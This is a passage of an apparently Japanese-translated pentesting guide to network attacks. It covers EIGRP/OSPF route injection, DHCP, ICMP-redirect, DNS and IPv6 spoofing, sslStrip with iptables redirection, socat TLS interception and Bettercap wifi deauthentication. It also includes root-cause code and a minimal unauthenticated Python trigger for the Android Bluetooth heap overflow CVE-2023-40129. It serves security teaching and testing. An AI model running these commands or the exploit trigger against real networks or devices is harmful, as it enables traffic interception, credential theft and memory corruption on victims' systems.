**EIGRP (Enhanced Interior Gateway Routing Protocol)** は動的ルーティングプロトコルで、**distance-vector protocol（距離ベクトル型）**です。認証が設定されておらず passive インターフェースが構成されていない場合、**侵入者**は EIGRP ルーティングに干渉し、**ルーティングテーブルの汚染**を引き起こす可能性があります。さらに、EIGRP ネットワーク（つまりオートノマスシステム）は**フラットでゾーンによる分割がない**ため、**攻撃者がルートを注入すると** そのルートはオートノマスな EIGRP システム全体に**拡散する**可能性が高くなります。

EIGRP システムを攻撃するには、**正規の EIGRP ルータとのネイバー関係を確立する**必要があり、これにより基本的な情報収集からさまざまな注入まで多くの可能性が開かれます。

[**FRRouting**](https://frrouting.org/) は BGP、OSPF、EIGRP、RIP などをサポートする**仮想ルータを実装**することを可能にします。攻撃者のシステムにこれをデプロイするだけで、ルーティングドメイン内で正規のルータを装うことができます。


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) は EIGRP (Enhanced Interior Gateway Routing Protocol) ブロードキャストの傍受機能を提供します。またパケット注入も可能で、これを利用してルーティング設定を変更できます。

### OSPF

Open Shortest Path First (OSPF) プロトコルでは、ルータ間の安全な通信を確保するために **MD5 認証が一般的に用いられます**。しかし、このセキュリティ対策は Loki や John the Ripper のようなツールによって破られる可能性があります。これらのツールは MD5 ハッシュをキャプチャしてクラッキングでき、認証キーを露呈させます。一旦キーを入手すれば、新しいルーティング情報を注入するために使用できます。ルートパラメータの設定と、破られたキーの設定には、それぞれ _Injection_ タブと _Connection_ タブが使用されます。

- **Capturing and Cracking MD5 Hashes:** Loki や John the Ripper といったツールが使用されます。
- **Configuring Route Parameters:** これは _Injection_ タブで行います。
- **Setting the Compromised Key:** キーは _Connection_ タブで設定します。

### その他の一般的なツールと情報源

- [**Above**](https://github.com/c4s73r/Above): ネットワークトラフィックをスキャンして脆弱性を発見するツール
- ネットワーク攻撃に関する**さらなる情報**は[**ここ**](https://github.com/Sab0tag3d/MITM-cheatsheet)で確認できます。

## **Spoofing**

攻撃者は偽の DHCP 応答を送信して、ネットワークに参加する新しいメンバの全てのネットワークパラメータ（GW、IP、DNS）を設定します。
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Check the [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirectは、attackerがあるIPへ到達する最良の経路であることを示すICMP packet type 1 code 5を送信することで行われます。victimがそのIPに接続しようとすると、そのpacketはattacker経由で送られます。
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

攻撃者は、被害者が問い合わせるドメインのいくつか（またはすべて）を名前解決します。
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasqで独自のDNSを構成する**
```bash
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts
sudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### ローカルゲートウェイ

システムやネットワークへの複数の経路が存在することがよくあります。ローカルネットワーク内のMAC addressesのリストを作成したら、_gateway-finder.py_を使用してIPv4 forwardingをサポートするホストを特定してください。

<details>
<summary>gateway-finder の使用例</summary>
```bash
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
</details>


### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

DNSルックアップが失敗した場合のローカルホスト解決には、Microsoft システムは **Link-Local Multicast Name Resolution (LLMNR)** や **NetBIOS Name Service (NBT-NS)** に依存します。同様に、**Apple Bonjour** や **Linux zero-configuration** の実装は、ネットワーク内のシステムを発見するために **Multicast DNS (mDNS)** を利用します。これらのプロトコルは認証されておらず、UDPでブロードキャストされるため、攻撃者がユーザーを悪意あるサービスへ誘導する目的で悪用できます。

Responderを使って、ホストが検索するサービスに対して偽の応答を送信し、サービスをなりすますことができます。\
Read here more information about [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

ブラウザは一般的に **Web Proxy Auto-Discovery (WPAD) protocol to automatically acquire proxy settings** を使ってプロキシ設定を自動取得します。これは、"http://wpad.example.org/wpad.dat" のようなURLから設定を取得することを伴います。クライアントがこのサーバを検出する方法はいくつかあります:

- **DHCP** 経由（特別なコード252エントリを利用して検出される）。
- **DNS** 経由（ローカルドメイン内で _wpad_ というホスト名を検索する）。
- **Microsoft LLMNR and NBT-NS** 経由（DNSが成功しない場合のフォールバック機構）。

ツール Responder はこのプロトコルを悪用して **malicious WPAD server** として振る舞います。DHCP、DNS、LLMNR、NBT-NS を用いてクライアントを誤誘導し、自分に接続させます。To dive deeper into how services can be impersonated using Responder [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

ネットワーク内でさまざまなサービスを提供して、ユーザーを騙していくつかの **plain-text credentials** を入力させようとすることができます。**More information about this attack in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

この攻撃は IPv6 の世界における ARP Spoofing に非常によく似ています。被害者に GW の IPv6 アドレスが攻撃者の MAC アドレスを持っていると誤認させることができます。
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

一部のOSは、ネットワーク上で送信されたRA packetsからデフォルトでgatewayを設定します。攻撃者をIPv6 routerとして宣言するには、次のような方法を使用できます：
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

デフォルトでは、一部の OS はネットワーク上の DHCPv6 パケットを読み取って DNS を設定しようとします。したがって、攻撃者は DHCPv6 パケットを送信して自身を DNS として設定することができます。DHCP は被害者に IPv6 アドレスも提供します。
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fake page and JS code injection)

## インターネット攻撃

### sslStrip

基本的にこの攻撃は、**user**が**HTTP**ページに**access**し、そのページが**HTTPS**版へ**redirecting**している場合に行われます。  
**sslStrip**は、**HTTP connection with** the **client and** a **HTTPS connection with** the **server**を**maintain**することで、通信を**plain text**で**sniff**できるようにします。
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy for bypassing HSTS

The **difference** between **sslStrip+ and dns2proxy** against **sslStrip** is that they will **redirect** for example _**www.facebook.com**_ **to** _**wwww.facebook.com**_ (note the **extra** "**w**") and will set the **address of this domain as the attacker IP**.

The **goal** of this technique is to **avoid HSTS** because _**wwww**.facebook.com_ **won't** be saved in the **cache** of the browser, so the browser will be tricked to perform **facebook authentication in HTTP**.\
Note that in order to perform this attack the victim has to try to access initially to [http://www.faceook.com](http://www.faceook.com) and not https. This can be done modifying the links inside an http page.

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ doesn't work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP listen in port
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL ポートで待ち受け

#### キーと自己署名証明書を生成
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 証明書を使用して待ち受ける
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 証明書を使用して待ち受け、ホストにリダイレクトする
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
場合によっては、クライアントが CA が有効かどうかを確認する場合、**CA によって署名された別の hostname の certificate を提供する**ことができます。\
別の興味深いテストは、**要求された hostname の certificate を self-signed で提供する**ことです。

他に試すべきこととしては、有効な certificate で署名を試みるがそれが有効な CA ではない場合や、あるいは有効な public key を使い、diffie hellman のような（実際の private key で何も復号する必要のない）アルゴリズムを強制的に使用させることです。そしてクライアントが実際の private key のプローブ（例えば hash）を要求したときに、偽のプローブを返してクライアントがこれを検証しないことを期待します。

## Bettercap

<details>
<summary>一般的な Bettercap のコマンド</summary>
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
</details>


### アクティブ探索の注意点

UDPパケットを要求されたポートを持たないデバイスに送信すると、ICMP (Port Unreachable) が返されることに注意してください。

### **ARP 探索**

ARPパケットはネットワーク内で使用されているIPを発見するために使われます。PCは可能な各IPアドレスに対してリクエストを送信し、使用中のアドレスだけが応答します。

### **mDNS (multicast DNS)**

BettercapはMDNSリクエスト（各X msごと）を送信して **\_services\_.dns-sd.\_udp.local** を問い合わせます。このパケットを受け取ったマシンは通常この要求に応答します。次に、"services" に応答するマシンのみを検索します。

**ツール**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercapはポート137/UDPに対し、名前 "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA" を問い合わせるパケットをブロードキャストします。

### **SSDP (Simple Service Discovery Protocol)**

Bettercapはあらゆる種類のサービスを探すためにSSDPパケットをブロードキャストします（UDP ポート 1900）。

### **WSD (Web Service Discovery)**

Bettercapはサービスを検索するためにWSDパケットをブロードキャストします（UDP ポート 3702）。


## Bluetooth (L2CAP/ATT/GATT) 攻撃

- Android FluorideはL2CAP PSMs上でサービスを公開します（例: SDP 0x0001, RFCOMM 0x0003, BNEP 0x000F, AVCTP 0x0017/0x001B, AVDTP 0x0019, ATT/GATT 0x001F）。サービスは次の方法で登録されます:
```c
uint16_t L2CA_Register2(uint16_t psm, const tL2CAP_APPL_INFO& p_cb_info,
bool enable_snoop, tL2CAP_ERTM_INFO* p_ertm_info,
uint16_t my_mtu, uint16_t required_remote_mtu,
uint16_t sec_level);
```
- BlueBlue フレームワークは Scapy ベースの L2CAP/ATT crafting を可能にします（BlueBorne l2cap_infra 上に構築）。例:
```python
acl  = ACLConnection(src_bdaddr, dst_bdaddr, auth_mode='justworks')
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=672)
gatt.send_frag(p8(GATT_READ)+p16(1234))
print(gatt.recv())
```
- CVE-2023-40129 (Fluoride GATT): Read Multiple Variable response builder における integer underflow により、MTU が可変長要素を切り詰め、+2 length field が考慮されない場合に約64KB の heap overflow を引き起こす可能性があります。

<details>
<summary>根本原因 (GATT Read Multiple Variable)</summary>
```c
static void build_read_multi_rsp(tGATT_SR_CMD* p_cmd, uint16_t mtu) {
uint16_t ii, total_len, len; uint8_t* p; bool is_overflow=false;
len = sizeof(BT_HDR) + L2CAP_MIN_OFFSET + mtu;
BT_HDR* p_buf = (BT_HDR*)osi_calloc(len); p_buf->offset=L2CAP_MIN_OFFSET;
p = (uint8_t*)(p_buf + 1) + p_buf->offset; *p++ = GATT_RSP_READ_MULTI_VAR;
p_buf->len=1;
for (ii=0; ii<p_cmd->multi_req.num_handles; ii++) {
tGATTS_RSP* p_rsp = ...; // dequeued
if (p_rsp) {
total_len = (p_buf->len + p_rsp->attr_value.len);
if (p_cmd->multi_req.variable_len) total_len += 2;
if (total_len > mtu) {
len = p_rsp->attr_value.len - (total_len - mtu); // BUG: ignores +2
is_overflow = true;
} else { len = p_rsp->attr_value.len; }
if (p_cmd->multi_req.variable_len) { UINT16_TO_STREAM(p, len); p_buf->len += 2; }
memcpy(p, p_rsp->attr_value.value, len); // heap overflow
if (!is_overflow) p += len; p_buf->len += len; if (is_overflow) break;
}
}
}
```
- variable-length entriesでは、overflow pathが (total_len - mtu) のみを差し引き、+2 length field を無視するため、len がアンダーフローし（例: 0xFFFE）、memcpy がバッファの末尾から~64KB先まで書き込みます。
</details>

- 最小の未認証トリガー（small MTU が 4番目の attribute でアンダーフローを強制する）:
```python
# GATT_REQ_READ_MULTI_VAR (0x20), MTU=55
acl  = ACLConnection(interface, bdaddr)
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=55)
pkt  = b'\x20'  # opcode
pkt += p16(9); pkt += p16(9); pkt += p16(9); pkt += p16(9)
gatt.send(pkt)
# On 4th insert: p_buf->len=55 (1 + 3*(16+2)), total_len=73 -> len=16-(73-55)=-2 -> ~64KB overwrite
```
### 電気通信 / Mobile-Core (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## 参考文献

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Paint it blue: Attacking the bluetooth stack (Synacktiv)](https://www.synacktiv.com/en/publications/paint-it-blue-attacking-the-bluetooth-stack)
- [BlueBorne L2CAP testing infra (l2cap_infra)](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)



{{#include ../../banners/hacktricks-training.md}}
